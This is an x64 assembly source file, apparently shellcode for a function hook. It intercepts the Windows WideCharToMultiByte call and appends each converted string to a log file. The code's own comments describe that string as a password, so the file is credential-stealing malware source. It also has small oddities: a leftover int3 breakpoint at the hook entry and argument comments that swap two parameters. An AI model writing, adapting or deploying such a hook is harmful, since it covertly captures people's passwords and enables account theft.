[bits 64]
    push r15
    sub rsp, 8
    call reloc_base
reloc_base:
    pop r15
    sub r15, 11

jmp hooked_func

; arg0: CodePage            rcx
; arg1: dwFlags             rdx
; arg2: ccWideChar          r8
; arg3: lpWideCharStr       r9
; arg4: lpMultiByteStr      [rsp + 32]
; arg5: cbMultiByte         [rsp + 40]
; arg6: lpDefaultChar       [rsp + 48]
; arg7: lpUseDefaultChar    [rsp + 56]
hooked_func:
    int3
        push rbp
        mov rbp, rsp

        mov [rbp + 32], rcx     ; code page
        mov [rbp + 40], rdx     ; dwflags
        mov [rbp + 48], r8      ; lpWideCharStr
        mov [rbp + 56], r9      ; ccWideChar

        ; rbp - 8 = return value
        ; rbp - 16 = bytes written
        ; rbp - 24 = text file hnd
        ; rbp - 32 = padding bytes
        sub rsp, 32             ; local variable space
        sub rsp, 64             ; shadow space

        ; call the original function
        mov rcx, [rbp + 32]     ; code page
        mov rdx, [rbp + 40]     ; dwflags
        mov r8, [rbp + 48]      ; lpWideCharStr
        mov r9, [rbp + 56]      ; ccWideChar

        mov rax, [rbp + 64]     ; lpMultiByteStr
        mov [rsp + 32], rax

        mov rax, [rbp + 72]     ; ccMultiByte
        mov [rsp + 40], rax

        mov rax, [rbp + 80]     ; lpDefaultChar
        mov [rsp + 48], rax

        mov rax, [rbp + 88]     ; lpUseDefaultChar
        mov [rsp + 56], rax
        call [r15 + params]     ; wideCharToMultiByte

        mov [rbp - 8], rax      ; return value

        cmp rax, 0
        je .shutdown

        mov [rbp - 16], rax     ; bytes written

        ; open log file
        mov rcx, r15
        add rcx, params + 32    ; file path
        mov rdx, 0x4            ; FILE_APPEND_DATA
        mov r8, 0x1             ; FILE_SHARE_READ
        xor r9, r9
        mov qword [rsp + 32], 4         ; OPEN_ALWAYS
        mov qword [rsp + 40], 0x80      ; FILE_ATTRIBUTE_NORMAL
        mov qword [rsp + 48], 0
        call [r15 + params + 8]         ; createFile

        cmp rax, -1
        je .shutdown

        mov [rbp - 24], rax             ; file hnd

        ; replace trailing zero with '\n' (0xa) in the passwd str
        mov rax, [rbp + 64]             ; lpMultiByteStr
        add rax, [rbp - 16]             ; bytes written
        dec rax
        mov byte [rax], 0xa             ; new line ascii

        ; write the text to the file
        mov rcx, [rbp - 24]             ; text file hnd
        mov rdx, [rbp + 64]             ; lpMultiByteStr
        mov r8, [rbp - 16]              ; bytes written
        xor r9, r9
        mov qword [rsp + 32], 0
        call [r15 + params + 16]        ; writeFile

        cmp rax, 0
        je .shutdown

    .shutdown:
        mov rcx, [rbp - 24]             ; text file hnd
        call [r15 + params + 24]        ; closeHandle

        leave
        add rsp, 8
        pop r15
        ret

align 16
params:
; wideCharToMultiByte   0
; createFile            8
; writeFile             16
; closeHandle           24
; filePath              32